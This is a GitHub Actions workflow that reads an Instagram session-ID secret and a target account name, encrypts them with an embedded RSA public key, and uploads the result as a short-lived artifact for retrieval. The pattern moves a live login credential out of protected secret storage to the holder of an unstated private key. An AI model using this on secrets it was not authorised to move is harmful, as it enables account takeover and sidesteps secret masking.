name: Harang one-time encrypted provider transfer
on: workflow_dispatch
permissions:
  contents: read
jobs:
  transfer:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Encrypt existing Instagram existing account session
        env:
          HARANG_EXISTING_KEY: ${{ secrets.IG_SESSIONID }}
          HARANG_EXISTING_ACCOUNT: ${{ secrets.TARGET_IG_ACCOUNT }}
        shell: bash
        run: |
          umask 077
          cat > public.pem <<'HARANG_PUBLIC_KEY'
          -----BEGIN PUBLIC KEY-----
          MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAwYjgUrmlVHrvJG7buGm4
          0GV8/NbyacKDJ+yv/WFxK7tGeo0SSkI8mMOLxcdabYWBIm/DbEihvx+NBpR8Vcef
          9fQuZNDuoxU/xypri6zo6Y/VDes4yw8RhESjkgBP+8Y64OVHapHFEzBdSIX7rZH3
          ICvnVVpJswyV/1y+5V8UbECu8M0K3RzBvKVkfTT6OC1yRGkIWgMN8hcL4lKl8QDb
          966CJCshJ6D7l4dbXDvlw/IaPBRqIlYTGxQM3JhOTelWy3yC9TVcE3hk+mTqvXfM
          VgAEHcfhCDuODkNtG6yb6+Yoi2QrXL63JVLHd1Wv/EWiFlcCmOmf/6lQsob3HGGP
          tLNptacwUvissNDlm8lRH5wIedNSlyseIK6to0eMxnZYLILs2TEya+6nyBmhWwj9
          KPsCvfALmY8QBO0qwruMs+kktY+X/N9q/S6ZhXftAs3/eWfQLBI4UUtvM7ISLCuP
          PH+XqvuYHaJop74Rw2KJlRryMKssgau9qv3JqSnQeNQbAgMBAAE=
          -----END PUBLIC KEY-----
          HARANG_PUBLIC_KEY
          python3 - <<'PY'
          import json, os, pathlib, subprocess
          key=os.environ.get('HARANG_EXISTING_KEY','')
          account=os.environ.get('HARANG_EXISTING_ACCOUNT','')
          assert key and len(key)<220 and len(account)<120, 'EXISTING_PROVIDER_CONFIGURATION_UNAVAILABLE'
          payload=json.dumps({'IG_SESSIONID':key,'TARGET_IG_ACCOUNT':account},separators=(',',':')).encode()
          p=subprocess.run(['openssl','pkeyutl','-encrypt','-pubin','-inkey','public.pem','-pkeyopt','rsa_padding_mode:oaep','-pkeyopt','rsa_oaep_md:sha256'],input=payload,capture_output=True)
          assert p.returncode==0, 'CONFIGURATION_ENCRYPTION_FAILED'
          pathlib.Path('provider.enc').write_bytes(p.stdout)
          PY
      - name: Store encrypted configuration for owner retrieval
        uses: actions/upload-artifact@v4
        with:
          name: harang-instagram-encrypted-bbe2c8170ea0
          path: provider.enc
          retention-days: 1
          compression-level: 0
